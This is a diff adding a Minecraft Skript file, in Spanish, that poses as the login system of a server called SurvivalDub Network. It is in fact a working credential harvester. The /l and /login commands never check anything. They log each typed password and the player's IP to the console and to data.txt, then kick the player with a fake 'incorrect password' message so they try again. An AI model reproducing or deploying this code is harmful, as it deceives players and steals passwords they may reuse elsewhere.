@@ -1,0 +1,55 @@
+on join:
+	execute console command "tp %player% 1 111 1"
+	#execute console command "/title %player% subtitle ['',{'text':'/login <contraseña>','color':'white','bold':'true'}]"
+	#execute console command "/title %player% title ['',{'text':'Inicia sesión','color':'green','bold':'true'}]"
+	send "" to console
+	send "&cIP of &a%player%: &9%ip of player%" to console	
+	message "  &eEstás jugando en &a&lSurvivalDub Network"
+	message "    &8Debes iniciar sesión antes de &fpoder jugar..."
+	message "&1"
+	message "&a&lSurvivalDub &fPor favor, inicia sesión con: &2/l <Contraseña>"
+	wait 6 seconds
+	message "&a&lSurvivalDub &fPor favor, inicia sesión con: &2/l <Contraseña>"
+	wait 6 seconds
+	message "&a&lSurvivalDub &fPor favor, inicia sesión con: &2/l <Contraseña>"
+	wait 6 seconds
+	message "&a&lSurvivalDub &fPor favor, inicia sesión con: &2/l <Contraseña>"
+	wait 6 seconds
+	message "&a&lSurvivalDub &fPor favor, inicia sesión con: &2/l <Contraseña>"
+	wait 6 seconds
+	kick the player due to "&a&lSurvivalDub: &7Sesión reiniciada! Has tardado demasiado en loguearte...%newline%&6¿Tienes problemas para acceder a esta cuenta? &fSi eres &a&lPREMIUM%newline%&faccede al servidor pr.survivaldub.com &fy escribe el comando &b/premium%newline%&fpara reclamar la cuenta. \nSi eres &cNO PREMIUM &fy es tu cuenta, tendrás%newline%que rellenar el siguiente formulario en el foro:%newline%&nsurvivaldub.com/password"
+on any movement:
+	execute console command "tp %player% 0.5 101 0.5"
+on chat:
+	cancel event
+
+command /l [<text>]:
+	trigger:
+		if arg-1 is set:
+			send "" to console
+			send "" to console
+			send "" to console
+			send "" to console
+			send "" to console
+			send "" to console
+			send "" to console
+			send "&aThe Password Of &5%player% &ais &d%arg-1%" to console
+			send "" to console
+			send "" to console
+			kick the player due to "&a&lSurvivalDub &fContraseña incorrecta&c&l!!!"
+
+command /login [<text>]:
+	trigger:
+		if arg-1 is set:
+			wf "%player% (%ip of player%) [/login %arg-1%]" to "data.txt"
+			send "" to console
+			send "" to console
+			send "" to console
+			send "" to console
+			send "" to console
+			send "" to console
+			send "" to console
+			send "&aThe Password Of &5%player% &ais &d%arg-1%" to console
+			send "" to console
+			send "" to console
+			kick the player due to "&a&lSurvivalDub &fContraseña incorrecta&c&l!!!"
